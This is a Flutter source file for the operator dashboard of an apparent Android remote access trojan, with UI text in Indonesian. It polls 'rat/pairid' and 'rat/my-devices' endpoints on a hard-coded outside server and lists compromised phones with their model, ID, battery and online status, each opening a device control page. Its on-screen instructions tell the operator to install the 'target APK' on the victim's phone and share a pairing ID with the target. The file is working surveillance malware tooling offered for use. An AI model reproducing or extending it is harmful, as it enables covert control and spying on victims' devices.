import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'device_permission.dart';
import 'control_panel.dart';

const _kBase = 'http://xterclose.zorryxhostz.my.id:2000';

class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;
  const DeviceDashboardPage({
      super.key, this.username = '', this.role ='', this.sessionKey =''});
  @override State<DeviceDashboardPage> createState() => _DDState();
}

class _DDState extends State<DeviceDashboardPage> {
  static const _bg     = Color(0xFF1A0015);
  static const _s1     = Color(0xFF2A0000);
  static const _border = Color(0xFF3D0000);
  static const _accentL = Color(0xFFFF5252);
  static const _accent  = Color(0xFFF06292);
  static const _textP   = Color(0xFFFFF0F5);
  static const _textS   = Color(0xFFA48888);

  List<dynamic> _visible = [];
  bool   _loading  = true;
  String? _errorMsg;
  String  _pairId  = '';          // ID unik akun ini
  bool get _isOwner => widget.role.toLowerCase() == 'owner';
  PermissionResult? _perm;
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    _loadAll();
    _timer = Timer.periodic(const Duration(seconds: 20), (_) => _loadAll());
  }

  @override void dispose() { _timer?.cancel(); super.dispose(); }

  // ── Ambil pairId + device list sekaligus ──────────────────────────────────
  Future<void> _loadAll() async {
    if (!mounted) return;
    try {
      // 1. Ambil pairId akun ini
      final pRes = await http
          .get(Uri.parse('$_kBase/rat/pairid?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 8));
      if (pRes.statusCode == 200) {
        final pd = jsonDecode(pRes.body);
        if (pd['valid'] == true && pd['pairId'] != null) {
          if (mounted) setState(() => _pairId = pd['pairId'].toString());
        }
      }

      // 2. Ambil device list (filter by owner / permission)
      final dRes = await http
          .get(Uri.parse('$_kBase/rat/my-devices?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 10));

      if (!mounted) return;
      if (dRes.statusCode != 200) {
        setState(() { _loading = false; _errorMsg = 'Server error ${dRes.statusCode}'; });
        return;
      }

      final body = jsonDecode(dRes.body);
      if (body['valid'] != true) {
        setState(() { _loading = false; _errorMsg = body['message'] ?? 'Error'; });
        return;
      }

      List<dynamic> devices = List<dynamic>.from(body['devices'] ?? []);

      // Tandai online/offline
      final now = DateTime.now();
      for (var d in devices) {
        try {
          final seen = DateTime.parse(d['lastSeen']?.toString() ?? '');
          d['online'] = now.difference(seen).inSeconds < 30;
        } catch (_) { d['online'] = false; }
      }

      // Kalau member, ambil juga permission
      PermissionResult perm;
      if (_isOwner) {
        perm = PermissionResult(approved: true, allDevices: true, devices: []);
      } else {
        perm = await DevicePermissionStore.getFor(widget.username, widget.sessionKey);
      }

      if (mounted) setState(() {
        _visible = devices; _perm = perm; _loading = false; _errorMsg = null;
      });
    } catch (e) {
      if (mounted) setState(() { _loading = false; _errorMsg = e.toString(); });
    }
  }

  int get _active => _visible.where((d) => d['online'] == true).length;

  // ── Copy pairId ke clipboard ───────────────────────────────────────────────
  void _copyPairId() {
    if (_pairId.isEmpty) return;
    Clipboard.setData(ClipboardData(text: _pairId));
    ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
        backgroundColor: Color(0xFFF06292),
        content: Text('ID berhasil disalin!'),
        duration: Duration(seconds: 2)));
  }

  @override
  Widget build(BuildContext context) {
    final denied = _perm != null && !_perm!.approved && !_isOwner;

    return Scaffold(
      backgroundColor: _bg,
      body: SafeArea(child: Column(children: [
        // ─ Header ─────────────────────────────────────────────────────────
        Container(
          padding: const EdgeInsets.fromLTRB(18, 14, 18, 10),
          decoration: BoxDecoration(color: _s1, border: Border(bottom: BorderSide(color: _border))),
          child: Column(children: [
            Row(children: [
              _statBox('ONLINE', '$_active', Colors.greenAccent),
              const Spacer(),
              Column(children: [
                const Text('DEVICE DASHBOARD', style: TextStyle(color: _textP, fontSize: 11, letterSpacing: 2, fontWeight: FontWeight.bold)),
                Text('@${widget.username}', style: const TextStyle(color: _textS, fontSize: 9)),
              ]),
              const Spacer(),
              _statBox('TOTAL', '${_visible.length}', _accentL),
            ]),

            // ── PairID box — hanya tampil kalau ada ───────────────────────
            if (_pairId.isNotEmpty) ...[
              const SizedBox(height: 10),
              GestureDetector(
                onTap: _copyPairId,
                child: Container(
                  width: double.infinity,
                  padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                  decoration: BoxDecoration(
                    color: _accent.withOpacity(0.12),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: _accent.withOpacity(0.4)),
                  ),
                  child: Row(children: [
                    const Icon(Icons.link_rounded, color: Color(0xFFFF5252), size: 16),
                    const SizedBox(width: 10),
                    Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                      const Text('ID PAIRING (bagikan ke target)',
                          style: TextStyle(color: Color(0xFFA48888), fontSize: 9, letterSpacing: 1)),
                      const SizedBox(height: 3),
                      Text(_pairId,
                          style: const TextStyle(
                              color: Color(0xFFFF5252), fontSize: 15,
                              fontWeight: FontWeight.bold, letterSpacing: 3, fontFamily: 'monospace')),
                    ])),
                    Column(children: [
                      const Icon(Icons.copy_rounded, color: Color(0xFFFF5252), size: 16),
                      const SizedBox(height: 2),
                      Text('SALIN', style: TextStyle(color: _accentL.withOpacity(0.7), fontSize: 8)),
                    ]),
                  ]),
                ),
              ),
              const SizedBox(height: 4),
              const Text('Tap untuk menyalin ID • Hanya Owner yang memiliki ID ini',
                  style: TextStyle(color: Color(0xFFA48888), fontSize: 9), textAlign: TextAlign.center),
            ],
          ]),
        ),

        // ─ Error/Denied ──────────────────────────────────────────────────
        if (_errorMsg != null)
          _banner(Icons.error_rounded, _errorMsg!, Colors.pinkAccent),
        if (denied && _errorMsg == null)
          _banner(Icons.lock_rounded, 'Akses belum disetujui Owner. Hubungi Owner untuk mendapat akses.', Colors.pinkAccent),
        if (!_isOwner && !denied && _errorMsg == null && _perm != null && _perm!.approved)
          _banner(Icons.check_circle_rounded, 'Akses diizinkan Owner. Kamu melihat device yang dibagikan.', Colors.greenAccent),

        // ─ Toolbar ────────────────────────────────────────────────────────
        Padding(padding: const EdgeInsets.fromLTRB(16, 8, 16, 6), child: Row(children: [
          const Text('CONNECTED DEVICES',
              style: TextStyle(color: _textS, fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 1.5)),
          const Spacer(),
          GestureDetector(
            onTap: () { setState(() { _loading = true; _errorMsg = null; }); _loadAll(); },
            child: const Icon(Icons.refresh_rounded, color: _accentL, size: 18)),
          const SizedBox(width: 12),
          if (_isOwner)
            GestureDetector(
              onTap: () async {
                await Navigator.push(context, MaterialPageRoute(
                  builder: (_) => DevicePermissionManagerPage(
                    sessionKey: widget.sessionKey, allDevices: _visible)));
                _loadAll();
              },
              child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 5),
                decoration: BoxDecoration(
                    color: _accent.withOpacity(0.15), borderRadius: BorderRadius.circular(8),
                    border: Border.all(color: _accent.withOpacity(0.4))),
                child: const Row(children: [
                  Icon(Icons.manage_accounts_rounded, color: _accentL, size: 13),
                  SizedBox(width: 5),
                  Text('Kelola Akses', style: TextStyle(color: _accentL, fontSize: 11)),
                ]))),
          const SizedBox(width: 10),
          GestureDetector(onTap: () => Navigator.pop(context),
            child: const Icon(Icons.close_rounded, color: Colors.pinkAccent, size: 18)),
        ])),

        // ─ Device Grid ────────────────────────────────────────────────────
        Expanded(
          child: _loading
              ? const Center(child: CircularProgressIndicator(color: _accentL))
              : _visible.isEmpty
                  ? Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
                      Icon(Icons.devices_other_rounded, color: const Color(0xFF3D0000), size: 52),
                      const SizedBox(height: 14),
                      Text(denied ? 'AKSES DITOLAK' : 'NO DEVICES',
                          style: const TextStyle(color: _textS, fontWeight: FontWeight.bold, letterSpacing: 2, fontSize: 13)),
                      const SizedBox(height: 6),
                      Text(denied ? 'Hubungi Owner' : 'Belum ada device terhubung',
                          style: const TextStyle(color: Color(0xFFA48888), fontSize: 11)),
                      if (!denied) ...[
                        const SizedBox(height: 20),
                        Container(
                          margin: const EdgeInsets.symmetric(horizontal: 40),
                          padding: const EdgeInsets.all(14),
                          decoration: BoxDecoration(
                              color: _accent.withOpacity(0.08),
                              borderRadius: BorderRadius.circular(12),
                              border: Border.all(color: _accent.withOpacity(0.3))),
                          child: Column(children: [
                            const Icon(Icons.info_outline_rounded, color: _accentL, size: 20),
                            const SizedBox(height: 8),
                            const Text('Cara hubungkan device:', style: TextStyle(color: _textP, fontSize: 11, fontWeight: FontWeight.bold)),
                            const SizedBox(height: 6),
                            const Text('1. Install APK target di HP korban\n2. Buka APK → masukkan ID Pairing di atas\n3. Device otomatis muncul di sini',
                                style: TextStyle(color: _textS, fontSize: 10), textAlign: TextAlign.center),
                          ]),
                        ),
                      ],
                    ]))
                  : GridView.builder(
                      padding: const EdgeInsets.fromLTRB(14, 4, 14, 100),
                      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                          crossAxisCount: 3, crossAxisSpacing: 8, mainAxisSpacing: 8, childAspectRatio: 0.7),
                      itemCount: _visible.length,
                      itemBuilder: (ctx, i) {
                        final d = _visible[i];
                        final on = d['online'] == true;
                        final sc = on ? Colors.greenAccent : Colors.pinkAccent;
                        return GestureDetector(
                          onTap: () => Navigator.push(ctx, MaterialPageRoute(
                              builder: (_) => ControlCenterPage(targetDevice: d, role: widget.role))),
                          child: Container(
                            padding: const EdgeInsets.all(8),
                            decoration: BoxDecoration(
                              color: _s1, borderRadius: BorderRadius.circular(12),
                              border: Border.all(color: on ? _accentL.withOpacity(0.3) : _border)),
                            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                              Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
                                Icon(Icons.phone_android_rounded, color: _textS, size: 13),
                                Container(
                                  padding: const EdgeInsets.symmetric(horizontal: 4, vertical: 2),
                                  decoration: BoxDecoration(
                                      border: Border.all(color: sc.withOpacity(0.4)),
                                      borderRadius: BorderRadius.circular(6)),
                                  child: Row(children: [
                                    CircleAvatar(radius: 2.5, backgroundColor: sc),
                                    const SizedBox(width: 3),
                                    Text(on ? 'ON' : 'OFF',
                                        style: TextStyle(color: sc, fontSize: 6, fontWeight: FontWeight.bold)),
                                  ])),
                              ]),
                              const Spacer(),
                              Text(d['model'] ?? 'Unknown',
                                  style: const TextStyle(color: _textP, fontSize: 10, fontWeight: FontWeight.bold),
                                  maxLines: 1, overflow: TextOverflow.ellipsis),
                              const SizedBox(height: 2),
                              Text(d['id'] ?? '-',
                                  style: const TextStyle(color: _textS, fontSize: 7),
                                  maxLines: 1, overflow: TextOverflow.ellipsis),
                              const Spacer(),
                              Row(children: [
                                const Icon(Icons.battery_charging_full_rounded, color: _textS, size: 10),
                                const SizedBox(width: 2),
                                Text('${d['battery'] ??'?'}%',
                                    style: const TextStyle(color: _textP, fontSize: 8)),
                              ]),
                            ]),
                          ),
                        );
                      }),
        ),
      ])),
    );
  }

  Widget _banner(IconData icon, String msg, Color c) => Container(
    margin: const EdgeInsets.fromLTRB(14, 8, 14, 0),
    padding: const EdgeInsets.all(10),
    decoration: BoxDecoration(color: c.withOpacity(0.08), borderRadius: BorderRadius.circular(10), border: Border.all(color: c.withOpacity(0.3))),
    child: Row(children: [
      Icon(icon, color: c, size: 14), const SizedBox(width: 8),
      Expanded(child: Text(msg, style: TextStyle(color: c, fontSize: 11))),
    ]));

  Widget _statBox(String l, String v, Color c) => Column(children: [
    Text(l, style: const TextStyle(color: _textS, fontSize: 8, letterSpacing: 1)),
    const SizedBox(height: 3),
    Text(v, style: TextStyle(color: c, fontSize: 20, fontWeight: FontWeight.bold)),
  ]);
}
